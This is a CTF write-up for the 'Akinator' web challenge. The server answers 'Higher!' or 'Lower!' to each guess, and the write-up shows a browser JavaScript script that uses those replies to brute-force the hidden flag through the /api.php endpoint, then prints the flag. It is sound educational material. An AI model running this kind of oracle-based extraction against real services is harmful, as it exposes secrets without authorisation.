# Akinator

## Overview
Writeup for **Akinator** from Override CTF 2026.

## Category
Web / Scripting / Logic

## Difficulty
Easy

## Description
The challenge presented a web interface themed around Akinator. The server prompted: *“I'm thinking of a secret... can you guess it?”* Responses were limited to "Higher!" or "Lower!", indicating a lexicographical comparison between the user's input and the hidden secret.

## Initial Analysis
The core mechanism was a string comparison leak. The backend was likely using a function equivalent to `strcmp($guess, $secret)`. 

In lexicographical comparison:
- **"Higher!"** implies `guess < secret`
- **"Lower!"** implies `guess > secret`

This meant the challenge was a **Binary Search problem on strings**. By observing the feedback, we could determine the correct character at each position of the flag prefix.

## Tools Used
- Browser Developer Tools (Inspect Element)
- JavaScript (Fetch API for automation)
- Logic (Binary Search / Prefix Matching)

## Approach
1. **API Reconnaissance:** Inspecting the network tab revealed the endpoint `/api.php` accepting JSON POST requests: `{"guess": "..."}`.
2. **Manual Verification:** Tested `OVRD{a` (Higher) vs `OVRD{z` (Lower) to confirm the prefix and comparison logic.
3. **Automated Extraction:** Developed a script to iterate through an alphabet, using the "Lower!" response as a trigger to lock in the previous character and move to the next position.

## Steps to Solve
```javascript
(async () => {
    let alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}-";
    let flag = "OVRD{";

    async function ask(g) {
        let r = await fetch("/api.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ guess: g })
        });
        return await r.json();
    }

    while (!flag.endsWith("}")) {
        for (let i = 0; i < alphabet.length; i++) {
            let c = alphabet[i];
            let test = flag + c;
            let d = await ask(test);
            
            let msg = JSON.stringify(d).toLowerCase();
            console.log(`Testing: ${test} | Response: ${msg}`);

            if (msg.includes("correct") || msg.includes("flag")) {
                console.log("%c FLAG FOUND: " + test, "color: green; font-size: 20px");
                return;
            }

            if (msg.includes("lower")) {
                // If 'test' is lexicographically bigger, the previous char was the correct one
                flag += alphabet[i - 1];
                console.log("%c Found Char: " + flag, "color: cyan");
                break;
            }
        }
    }
})();
```

## Flag
`OVRD{b1n4ry_s34rch_m4st3r_4k1n4t0r_d3f34t3d_938m2398eu23}`

## What I Learned
- **Information Leakage:** Simple comparison operators can leak enough information to reconstruct an entire secret.
- **Side-Channel Timing (Concept):** While this was a logic-based leak, it mirrors timing attacks where the time taken to compare strings leaks the number of matching characters.
- **Automation:** Using the browser console to solve Web CTFs is often faster than writing external Python scripts for simple API-based challenges.

## References
_N/A_
